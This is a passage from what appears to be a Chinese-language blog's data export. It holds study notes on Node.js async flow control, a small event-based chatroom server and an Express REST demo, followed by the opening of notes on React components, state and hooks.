language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">`<span class=\"hljs-subst\">$&#123;id&#125;</span> has close the chatroom.\\n`</span>);<br>    channel.<span class=\"hljs-title function_\">removeAllListeners</span>(<span class=\"hljs-string\">&#x27;broadcast&#x27;</span>);<br>&#125;);<br><br><span class=\"hljs-comment\">//设定监听器最多的数量为50；</span><br>channel.<span class=\"hljs-title function_\">setMaxListeners</span>(<span class=\"hljs-number\">50</span>);<br><br><span class=\"hljs-keyword\">const</span> server=net.<span class=\"hljs-title function_\">createServer</span>(<span class=\"hljs-function\"><span class=\"hljs-params\">client</span>=&gt;</span>&#123;<br>    <span class=\"hljs-keyword\">const</span> id=<span class=\"hljs-string\">`[<span class=\"hljs-subst\">$&#123;client.remoteAddress&#125;</span>:<span class=\"hljs-subst\">$&#123;client.remotePort&#125;</span>]`</span>;<br>    channel.<span class=\"hljs-title function_\">emit</span>(<span class=\"hljs-string\">&#x27;join&#x27;</span>,id,client);<br>    client.<span class=\"hljs-title function_\">on</span>(<span class=\"hljs-string\">&#x27;data&#x27;</span>,<span class=\"hljs-function\"><span class=\"hljs-params\">data</span>=&gt;</span>&#123;<br>        data=data.<span class=\"hljs-title function_\">toString</span>();<br>        <span class=\"hljs-keyword\">if</span>(data===<span class=\"hljs-string\">&#x27;*&#x27;</span>)&#123;<br>            channel.<span class=\"hljs-title function_\">emit</span>(<span class=\"hljs-string\">&#x27;shutdown&#x27;</span>,id);<br>        &#125;<br>        <span class=\"hljs-keyword\">if</span>(data===<span class=\"hljs-string\">&#x27;-&#x27;</span>)&#123;<br>            channel.<span class=\"hljs-title function_\">emit</span>(<span class=\"hljs-string\">&#x27;leave&#x27;</span>,id);<br>        &#125;<br>        channel.<span class=\"hljs-title function_\">emit</span>(<span class=\"hljs-string\">&#x27;broadcase&#x27;</span>,id,data);<br>    &#125;);<br>    client.<span class=\"hljs-title function_\">on</span>(<span class=\"hljs-string\">&#x27;close&#x27;</span>,<span class=\"hljs-function\">()=&gt;</span>&#123;<br>        channel.<span class=\"hljs-title function_\">emit</span>(<span class=\"hljs-string\">&#x27;leave&#x27;</span>,id);<br>    &#125;);<br>&#125;);<br><br>server.<span class=\"hljs-title function_\">listen</span>(<span class=\"hljs-number\">8888</span>);<br></code></pre></td></tr></table></figure>\n\n<h3 id=\"5-异步开发的难题\"><a href=\"#5-异步开发的难题\" class=\"headerlink\" title=\"5.异步开发的难题\"></a>5.异步开发的难题</h3><blockquote>\n<p>创建异步程序时，需要关注：</p>\n<p>1.事件轮询的条件；</p>\n<p>2.程序变量；</p>\n<p>3.其他随程序逻辑执行而发生变化的资源；</p>\n</blockquote>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-comment\">//作用域是如何导致bug出现的</span><br><br><span class=\"hljs-keyword\">function</span>  <span class=\"hljs-title function_\">asyncFunction</span>(<span class=\"hljs-params\">callback</span>)&#123;<br>    <span class=\"hljs-built_in\">setTimeout</span>(callback,<span class=\"hljs-number\">200</span>);<br>&#125;<br><br><span class=\"hljs-keyword\">let</span> color=<span class=\"hljs-string\">&#x27;green&#x27;</span>;\t\t\t\t<span class=\"hljs-comment\">//初始color</span><br><span class=\"hljs-title function_\">asyncFunction</span>(<span class=\"hljs-function\">()=&gt;</span>&#123;<br>    <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">`The color is <span class=\"hljs-subst\">$&#123;color&#125;</span>.`</span>);\t\t\t<span class=\"hljs-comment\">//等待200ms输出color</span><br>&#125;);<br><br>color=<span class=\"hljs-string\">&#x27;blue&#x27;</span>\t\t\t<span class=\"hljs-comment\">//结果为输出blue；</span><br></code></pre></td></tr></table></figure>\n\n<blockquote>\n<p>JS闭包可以冻结color的值；</p>\n<p>下面的例子对asyncFunction的调用被封装到一个以color为参数的匿名函数里。</p>\n</blockquote>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\">color=<span class=\"hljs-string\">&#x27;blue&#x27;</span>\t\t\t<br>(<span class=\"hljs-function\"><span class=\"hljs-params\">color</span>=&gt;</span>&#123;<br>    <span class=\"hljs-title function_\">asyncFunction</span>(<span class=\"hljs-function\">()=&gt;</span>&#123;<br>        <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">`The color is `</span>,color);<br>    &#125;);<br>&#125;)(color);<br><br>color=<span class=\"hljs-string\">&#x27;green&#x27;</span>;\t\t\t\t<span class=\"hljs-comment\">//结果为输出blue；</span><br></code></pre></td></tr></table></figure>\n\n<h3 id=\"6-异步逻辑的顺序化\"><a href=\"#6-异步逻辑的顺序化\" class=\"headerlink\" title=\"6.异步逻辑的顺序化\"></a>6.异步逻辑的顺序化</h3><blockquote>\n<p>让一组异步任务顺序执行的概念被Node社区称为流程控制；</p>\n<p>控制分为：串行、并行</p>\n</blockquote>\n<p><img src=\"https://s3.bmp.ovh/imgs/2023/02/09/b33ca1d4d596f929.jpg\"></p>\n<h4 id=\"（1）串行流程控制\"><a href=\"#（1）串行流程控制\" class=\"headerlink\" title=\"（1）串行流程控制\"></a>（1）串行流程控制</h4><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-comment\">//以下代码用回调让任务顺序执行</span><br><span class=\"hljs-built_in\">setTimeout</span>(<span class=\"hljs-function\">()=&gt;</span>&#123;<br>    <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">&quot;Wait 1000ms...&quot;</span>);<br>    <span class=\"hljs-built_in\">setTimeout</span>(<span class=\"hljs-function\">()=&gt;</span>&#123;<br>        <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">&quot;Wait 500ms...&quot;</span>);<br>        <span class=\"hljs-built_in\">setTimeout</span>(<span class=\"hljs-function\">()=&gt;</span>&#123;<br>            <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">&quot;Wait 100ms...&quot;</span>);<br>        &#125;,<span class=\"hljs-number\">100</span>)<br>    &#125;,<span class=\"hljs-number\">500</span>)<br>&#125;,<span class=\"hljs-number\">1000</span>)<br></code></pre></td></tr></table></figure>\n\n<p>实际情况中可能是读取文件、发送http请求等；</p>\n<h5 id=\"借助async流程控制工具执行\"><a href=\"#借助async流程控制工具执行\" class=\"headerlink\" title=\"借助async流程控制工具执行\"></a>借助async流程控制工具执行</h5><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs shell\">npm install async<br></code></pre></td></tr></table></figure>\n\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-keyword\">const</span> <span class=\"hljs-keyword\">async</span>=<span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">&#x27;async&#x27;</span>);<br><br><span class=\"hljs-comment\">//维护一个顺序数组</span><br><span class=\"hljs-keyword\">async</span>.<span class=\"hljs-title function_\">series</span>([<br>    <span class=\"hljs-function\"><span class=\"hljs-params\">callback</span>=&gt;</span>&#123;<br>        <span class=\"hljs-built_in\">setTimeout</span>(<span class=\"hljs-function\">()=&gt;</span>&#123;<br>            <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">&quot;Wawit 1000ms...&quot;</span>);<br>            <span class=\"hljs-title function_\">callback</span>();<br>        &#125;,<span class=\"hljs-number\">1000</span>);<br>    &#125;,<br>    <span class=\"hljs-function\"><span class=\"hljs-params\">callback</span>=&gt;</span>&#123;<br>        <span class=\"hljs-built_in\">setTimeout</span>(<span class=\"hljs-function\">()=&gt;</span>&#123;<br>            <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">&quot;Wawit 500ms...&quot;</span>);<br>            <span class=\"hljs-title function_\">callback</span>();<br>        &#125;,<span class=\"hljs-number\">500</span>)<br>    &#125;,<br>    <span class=\"hljs-function\"><span class=\"hljs-params\">callback</span>=&gt;</span>&#123;<br>        <span class=\"hljs-built_in\">setTimeout</span>(<span class=\"hljs-function\">()=&gt;</span>&#123;<br>            <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">&quot;Wawit 100ms...&quot;</span>);<br>            <span class=\"hljs-title function_\">callback</span>();<br>        &#125;,<span class=\"hljs-number\">100</span>);<br>    &#125;<br>]);<br></code></pre></td></tr></table></figure>\n\n<ul>\n<li>可读性、可维护性更强；</li>\n<li>刻意回避回调嵌套；</li>\n</ul>\n<h4 id=\"（2）实现串行化流程控制\"><a href=\"#（2）实现串行化流程控制\" class=\"headerlink\" title=\"（2）实现串行化流程控制\"></a>（2）实现串行化流程控制</h4><ul>\n<li>按照预期执行的顺序维护一个数组；</li>\n<li>FIFO方法完成任务；</li>\n<li>每个任务完成以后调用一个函数来返回任务执行的成功与否；</li>\n</ul>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title function_\">TaskA</span>(<span class=\"hljs-params\"></span>)&#123;<br>    <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">&quot;Doing work A!&quot;</span>);<br>    <span class=\"hljs-title function_\">next</span>();<br>&#125;<br><br><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title function_\">TaskB</span>(<span class=\"hljs-params\"></span>)&#123;<br>    <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">&quot;Doing work B!&quot;</span>);<br>    <span class=\"hljs-title function_\">next</span>();<br>&#125;<br><br><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title function_\">TaskC</span>(<span class=\"hljs-params\"></span>)&#123;<br>    <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">&quot;Doing work C!&quot;</span>);<br>    <span class=\"hljs-title function_\">next</span>();<br>&#125;<br><br><span class=\"hljs-comment\">//维护的一个数组；</span><br><span class=\"hljs-keyword\">const</span> tasks=[<span class=\"hljs-title class_\">TaskA</span>,<span class=\"hljs-title class_\">TaskB</span>,<span class=\"hljs-title class_\">TaskC</span>];<br><br><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title function_\">next</span>(<span class=\"hljs-params\">err,result</span>)&#123;<br>    <span class=\"hljs-keyword\">if</span>(err) <span class=\"hljs-keyword\">throw</span> err;\t\t\t\t   <span class=\"hljs-comment\">//如果出错，就抛出错误</span><br>    <span class=\"hljs-keyword\">const</span> currentTask=tasks.<span class=\"hljs-title function_\">shift</span>();\t<span class=\"hljs-comment\">//没有出错，移动数组；</span><br>    <span class=\"hljs-keyword\">if</span>(currentTask)&#123;<br>       <span class=\"hljs-title function_\">currentTask</span>(result);<br>    &#125;<br>&#125;<br><br><span class=\"hljs-title function_\">next</span>();<br></code></pre></td></tr></table></figure>\n\n<h4 id=\"（3）实现并行化流程控制\"><a href=\"#（3）实现并行化流程控制\" class=\"headerlink\" title=\"（3）实现并行化流程控制\"></a>（3）实现并行化流程控制</h4><blockquote>\n<p>为了让异步任务并行执行，人需要维护一个数组；但是此时任务的存放顺序无关紧要；</p>\n</blockquote>\n<h4 id=\"（4）利用社区的工具进行流程控制\"><a href=\"#（4）利用社区的工具进行流程控制\" class=\"headerlink\" title=\"（4）利用社区的工具进行流程控制\"></a>（4）利用社区的工具进行流程控制</h4><ul>\n<li>Async</li>\n<li>Step</li>\n<li>Seq</li>\n</ul>\n<h2 id=\"三、Node-Web\"><a href=\"#三、Node-Web\" class=\"headerlink\" title=\"三、Node Web\"></a>三、Node Web</h2><ul>\n<li>创建一个新的Web程序</li>\n<li>搭建RESTful服务</li>\n<li>持久化数据</li>\n<li>使用模板</li>\n</ul>\n<h3 id=\"1-Node-Web程序结构\"><a href=\"#1-Node-Web程序结构\" class=\"headerlink\" title=\"1.Node Web程序结构\"></a>1.Node Web程序结构</h3><ul>\n<li>package.json  包含依赖项列表和运行这个程序的命令的文件；</li>\n<li>public/             静态资源文件夹，css/客户端js都在这；</li>\n<li>node_modules/ 项目的依赖项会安装到这里；</li>\n</ul>\n<h5 id=\"程序代码\"><a href=\"#程序代码\" class=\"headerlink\" title=\"程序代码\"></a>程序代码</h5><ul>\n<li>app.js/index.js          设置程序的代码；</li>\n<li>models/                    数据库模型；</li>\n<li>views/                       用来渲染的页面模板；</li>\n<li>controllers/routes      HTTP请求处理器；</li>\n<li>middleware/              中间件组件；</li>\n</ul>\n<blockquote>\n<p>如何组织程序是我的自由，大部分web框架都很灵活；</p>\n</blockquote>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs shell\">npm install --save express<br>npm rm express --save<br></code></pre></td></tr></table></figure>\n\n<p>一个简单的服务器，使用express（）创建一个程序实例，添加路由处理器，然后将实例绑定到一个TCP端口；</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-keyword\">const</span> express=<span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">&#x27;express&#x27;</span>);<br><br><span class=\"hljs-keyword\">const</span> app=<span class=\"hljs-title function_\">express</span>();<br><br><span class=\"hljs-keyword\">const</span> port=process.<span class=\"hljs-property\">env</span>.<span class=\"hljs-property\">PORT</span> || <span class=\"hljs-number\">3000</span>;<br><br>app.<span class=\"hljs-title function_\">get</span>(<span class=\"hljs-string\">&#x27;/&#x27;</span>,<span class=\"hljs-function\">(<span class=\"hljs-params\">req,res</span>)=&gt;</span>&#123;<br>    res.<span class=\"hljs-title function_\">send</span>(<span class=\"hljs-string\">&quot;Hello,world!&quot;</span>);<br>&#125;);<br><br>app.<span class=\"hljs-title function_\">listen</span>(port,<span class=\"hljs-function\">()=&gt;</span>&#123;<br>    <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">`Express web app available at localhost:<span class=\"hljs-subst\">$&#123;port&#125;</span>`</span>);<br>&#125;)<br></code></pre></td></tr></table></figure>\n\n<h5 id=\"npm脚本\"><a href=\"#npm脚本\" class=\"headerlink\" title=\"npm脚本\"></a>npm脚本</h5><blockquote>\n<p>启动服务起的命令（<code>node index.js</code>）可以保存问npm脚本；如下可以使用<code>npm start</code>启动项目；</p>\n</blockquote>\n<figure class=\"highlight json\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs json\"><span class=\"hljs-attr\">&quot;scripts&quot;</span><span class=\"hljs-punctuation\">:</span> <span class=\"hljs-punctuation\">&#123;</span><br>   <span class=\"hljs-attr\">&quot;start&quot;</span><span class=\"hljs-punctuation\">:</span><span class=\"hljs-string\">&quot;node index.js&quot;</span><br> <span class=\"hljs-punctuation\">&#125;</span><span class=\"hljs-punctuation\">,</span><br></code></pre></td></tr></table></figure>\n\n<h5 id=\"搭建一个RESTful-Web服务\"><a href=\"#搭建一个RESTful-Web服务\" class=\"headerlink\" title=\"搭建一个RESTful Web服务\"></a>搭建一个RESTful Web服务</h5><ul>\n<li>POST  /articles   </li>\n<li>GET    /articles/:id</li>\n<li>GET    /articles</li>\n<li>DELETE  /articles/:id</li>\n</ul>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs shell\">curl http://127.0.0.1:3000/articles/0<br>curl -X DELETE http://127.0.0.1:3000/articles/0<br></code></pre></td></tr></table></figure>\n\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs shell\"><span class=\"hljs-meta prompt_\">#</span><span class=\"language-bash\">官方消息体解析器</span><br>npm install --save bodt-parser<br></code></pre></td></tr></table></figure>\n\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-keyword\">const</span> express=<span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">&#x27;express&#x27;</span>);<br><span class=\"hljs-keyword\">const</span> bodyParser=<span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">&#x27;body-parser&#x27;</span>);<br><br><span class=\"hljs-keyword\">const</span> articles=[&#123;<span class=\"hljs-attr\">title</span>:<span class=\"hljs-string\">&#x27;NodeJS入门&#x27;</span>&#125;,&#123;<span class=\"hljs-attr\">title</span>:<span class=\"hljs-string\">&#x27;VueJS入门&#x27;</span>&#125;,&#123;<span class=\"hljs-attr\">title</span>:<span class=\"hljs-string\">&#x27;深入浅出VueJS&#x27;</span>&#125;];<br><br><span class=\"hljs-keyword\">const</span> app=<span class=\"hljs-title function_\">express</span>();<br><br>app.<span class=\"hljs-title function_\">set</span>(<span class=\"hljs-string\">&#x27;port&#x27;</span>,process.<span class=\"hljs-property\">env</span>.<span class=\"hljs-property\">PORT</span>||<span class=\"hljs-number\">3000</span>);<br><br>app.<span class=\"hljs-title function_\">use</span>(bodyParser.<span class=\"hljs-title function_\">json</span>());<br>app.<span class=\"hljs-title function_\">use</span>(bodyParser.<span class=\"hljs-title function_\">urlencoded</span>(&#123;<span class=\"hljs-attr\">extended</span>:<span class=\"hljs-literal\">true</span>&#125;));<br><br><br>app.<span class=\"hljs-title function_\">get</span>(<span class=\"hljs-string\">&#x27;/articles&#x27;</span>,<span class=\"hljs-function\">(<span class=\"hljs-params\">req,res,next</span>)=&gt;</span>&#123;<br>    res.<span class=\"hljs-title function_\">send</span>(articles);<br>&#125;);<br><br>app.<span class=\"hljs-title function_\">get</span>(<span class=\"hljs-string\">&#x27;/articles/:id&#x27;</span>,<span class=\"hljs-function\">(<span class=\"hljs-params\">req,res,next</span>)=&gt;</span>&#123;<br>    <span class=\"hljs-keyword\">const</span> id=req.<span class=\"hljs-property\">params</span>.<span class=\"hljs-property\">id</span>;<br>    <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">&quot;Fetching article &quot;</span>,id,<span class=\"hljs-string\">&quot;.&quot;</span>);<br>    res.<span class=\"hljs-title function_\">send</span>(articles[id]);<br>&#125;);<br><br>app.<span class=\"hljs-title function_\">delete</span>(<span class=\"hljs-string\">&#x27;/articles/:id&#x27;</span>,<span class=\"hljs-function\">(<span class=\"hljs-params\">req,res,next</span>)=&gt;</span>&#123;<br>    <span class=\"hljs-keyword\">const</span> id=req.<span class=\"hljs-property\">params</span>.<span class=\"hljs-property\">id</span>;<br>    <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">&quot;Deleting article &quot;</span>,id,<span class=\"hljs-string\">&quot;.&quot;</span>);<br>    <span class=\"hljs-keyword\">delete</span> articles[id];<br>    res.<span class=\"hljs-title function_\">send</span>(&#123;<span class=\"hljs-attr\">message</span>:<span class=\"hljs-string\">&#x27;Article has been deleted.&#x27;</span>&#125;);<br>&#125;);<br><br>app.<span class=\"hljs-title function_\">post</span>(<span class=\"hljs-string\">&#x27;/articles&#x27;</span>,<span class=\"hljs-function\">(<span class=\"hljs-params\">req,res,next</span>)=&gt;</span>&#123;<br>    <span class=\"hljs-keyword\">const</span> article=&#123;<span class=\"hljs-attr\">title</span>:req.<span class=\"hljs-property\">body</span>.<span class=\"hljs-property\">title</span>&#125;;<br>    articles.<span class=\"hljs-title function_\">push</span>(article);<br>    res.<span class=\"hljs-title function_\">send</span>(articles);<br>&#125;);<br><br>app.<span class=\"hljs-title function_\">listen</span>(app.<span class=\"hljs-title function_\">get</span>(<span class=\"hljs-string\">&#x27;port&#x27;</span>),<span class=\"hljs-function\">()=&gt;</span>&#123;<br>    <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">&#x27;App started on port &#x27;</span>,app.<span class=\"hljs-title function_\">get</span>(<span class=\"hljs-string\">&#x27;port&#x27;</span>));<br>&#125;);<br><br><span class=\"hljs-variable language_\">module</span>.<span class=\"hljs-property\">exports</span>=app;<br></code></pre></td></tr></table></figure>\n\n<blockquote>\n<p>到这一步为止，跟真正的Web程序差不多了，只需要完成两个新的任务：</p>\n<p>永久保存数据到数据库；</p>\n<p>形成可读版本的文章；</p>\n</blockquote>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs shell\"><span class=\"hljs-meta prompt_\">#</span><span class=\"language-bash\">模板引擎</span><br>npm install ejs --save<br></code></pre></td></tr></table></figure>\n\n<h3 id=\"2-Node-Web开发\"><a href=\"#2-Node-Web开发\" class=\"headerlink\" title=\"2.Node Web开发\"></a>2.Node Web开发</h3><blockquote>\n<p>现代Web开发中，使用Node来进行工具和服务的情况越来越多；</p>\n<p>需要负责和配置维护工具库；</p>\n<p>本章使用npm脚本、Gulp和Webpack搭建易于维护的项目；</p>\n</blockquote>\n<h4 id=\"前端构建工具的优点：\"><a href=\"#前端构建工具的优点：\" class=\"headerlink\" title=\"前端构建工具的优点：\"></a>前端构建工具的优点：</h4><ul>\n<li>代码简单易懂；</li>\n<li>支持代码转译；</li>\n<li>源码映射；</li>\n</ul>\n<h4 id=\"Webpck\"><a href=\"#Webpck\" class=\"headerlink\" title=\"Webpck\"></a>Webpck</h4><ul>\n<li>快速搭建支持增量式结构的构建系统；</li>\n</ul>\n<h2 id=\"五、服务器端框架\"><a href=\"#五、服务器端框架\" class=\"headerlink\" title=\"五、服务器端框架\"></a>五、服务器端框架</h2><ul>\n<li>使用热门的Node Web框架；</li>\n<li>选择合适的框架；</li>\n<li>用Web框架搭建Web程序；</li>\n</ul>\n<h4 id=\"1-用户画像\"><a href=\"#1-用户画像\" class=\"headerlink\" title=\"1.用户画像\"></a>1.用户画像</h4><blockquote>\n<p>假设一个场景，需要做一个内容分发系统，用户需要上传下载法律文件，在线阅读文件；</p>\n<p>徐娅萍生成PDF还有电子商务组件，你会怎么考虑技术栈？</p>\n</blockquote>\n<ul>\n<li>文件上传下载阅读–Express</li>\n<li>生成PDF的微服务–hapi</li>\n<li>电子商务组件–SailJS</li>\n</ul>\n<p>使用用户画像考虑设计问题是通用做法。</p>\n"},{"title":"React","date":"2023-03-27T10:51:45.000Z","mp3":null,"cover":"img/bg4.jpeg","_content":"\n\n# React\n\n## 一、应用\n\n- 前端应用\n- 移动原生\n- 桌面应用Electron  React 3D\n\n## 二、原型\n\n1. Facebook在其php生态中引入了组合式组件的思想，启发了后来的react设计\n2. J.W创建了FaxJS,也就是React的原型；\n3. Facebook收购ins后，该项目在内使用，基于FaxJS创建了React；\n\n## 三、React设计思路\n\n### 1.UI编程痛点\n\n- 状态更新，UI不会自动更新，需要手动调用DOM\n- 欠缺基本的代码层面的封装和隔离，代码层面没有组件化\n- UI之间的数据依赖关系需要手动维护，如果 依赖链条过长，会遇到“Callbace Hell”\n\n### 2.响应式与转换式\n\n- 转换式：给定输入求解输出；  （编译器、数值计算）\n- 响应式：监听事件没消息驱动； （监控系统、UI界面）\n\n```\n事件->执行既定的回调->状态更新->UI更新\n```\n\n### 3.响应式编程\n\n- 状态更新，UI自动更新\n- 前端代码组件化、可复用、可封装\n- 状态之间的互相依赖关系、只需要声明计科\n\n### 4.组件化\n\n- 组件是组件的组合/原子组件\n- 组件内部拥有状态，外部不可见\n- 父组件可将状态传入组件内部\n\n### 5.状态归属问题\n\n```\nNote：共享变量需要提升到最近的祖先组件、可以用状态管理解决；\nE.g:如果状态归属于两个节点，就向上寻找到最近的祖宗节点；\n```\n\n![](https://s3.bmp.ovh/imgs/2023/01/30/edd9edf1a3d14f27.jpg)\n\n> Javascript中、函数是【一等公民】\n>\n> **通过向子组件传递function来改变根组件的变量（形成双向数据流）\n\n### 6.思考\n\n- React是单向数据流、还是双向数据流？\n\n> 其实是单向数据流，永远是父组件给子组件传递，并不代表子组件不能改变父组件数据；\n\n- 如何解决状态不合理上升的问题？（第五节解决）\n\n> 状态管理库\n\n- 组件的状态改变之后，如何更新DOM？（第四节解决）\n\n> 1\n\n### 7.组件设计\n\n- 组件声明了状态和UI的映射；\n- 组件拥有Props/State两种状态；\n- 组件可由其他组件拼装而成；\n\n解法：\n\n- 组件内部拥有私有状态State\n- 组件接受外部的Props状态提供复用性\n- 根据当前的state/props返回一个UI\n\n```react\nfunction Component(props){\n    const {url}=props;\n    this.text='click me';\n    \n    return(\n    \t<div>\n        \t<SubComponent props={{color:'red'}}></SubComponent>\n            <img src={url}></img>\n            <button>clike me</button>\n        </div>\n    )\n}\n```\n\n### 8.生命周期\n\n![](https://s3.bmp.ovh/imgs/2023/01/30/4fc6e86cf176a88b.jpg)\n\n### 9.React Hooks \n\n```react\nimport React,{useState} from 'react';\n\nfunction Example(){\n    //声明一个新状态需要手动调用useState，返回一个状态和set该状态的函数；\n    const [count,setState]=useState(0);\n    \n    //传入一个函数和一个数组秘书组是状态的数组，称作依赖项，该函数在mount时执行\n    //有“副作用”的函数，要传入useEffect来执行。副作用代表出来单纯的计算之外还要做其他事情。比如网络请求，更新DOM，localStorage存储数据等；\n    useEffect(()=>{\n        document.title=`You clicked ${count} times`;\n    })\n    \n    return(\n    \t<div>\n        \t<p>Clicked { count } 